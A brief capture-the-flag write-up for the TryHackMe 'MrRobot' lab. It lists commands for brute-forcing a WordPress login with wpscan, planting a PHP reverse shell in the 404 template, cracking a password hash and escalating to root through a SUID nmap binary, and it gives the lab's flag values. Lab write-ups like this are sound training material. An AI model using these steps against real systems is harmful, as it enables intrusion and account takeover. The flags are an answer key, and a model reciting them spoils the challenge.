---
title: MrRobot
description: 'Enumeration, brute forcing a Wordpress login and privilege escalation through SUID'
pubDate: 2020-10-04
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/7a8797ae59733f2a72f0e8a8748be128.jpeg'
---

## Key 1
    - http://10.10.144.188/robots.txt
        - http://10.10.144.188/key-1-of-3.txt
            073403c8a58a1f80d943455fb30724b9

## Key 2
    - http://10.10.144.188/fsocity.dic > uniq.txt
    - https://10.10.143.235/wp-login <- brute force with 'elliot' and uniq.txt
    - wpscan --url http://10.10.143.235/wp-login -U elliot -P uniq.txt
        elliot:ER28-0652

    - edit the 404 page with the rev_shell.php (Appearance > Editor > 404.php)
        - start listener on port 4444
        - go to https://10.10.143.235/404

        daemon@linux:/home/robot$ cat password.raw-md5
        robot:c3fcd3d76192e4007dfb496cca67e13b

        robot:abcdefghijklmnopqrstuvwxyz
        - su - robot <- pass: abcdefghijklmnopqrstuvwxyz

        cat key-2-of-3.txt
            822c73956184f694993bede3eb39f959

## Key 3
    - LinPEAS -> SUID - Check easy privesc, exploits and write perms
        -/usr/local/bin/nmap
    - OR Find root processes:
        - find / -perm +6000 2>/dev/null | grep '/bin/'
            - /usr/local/bin/nmap
            https://gtfobins.github.io/gtfobins/nmap/#shell

    - cat /root/key-3-of-3.txt
        04787ddef27c3dee1ee161b21670b4e4
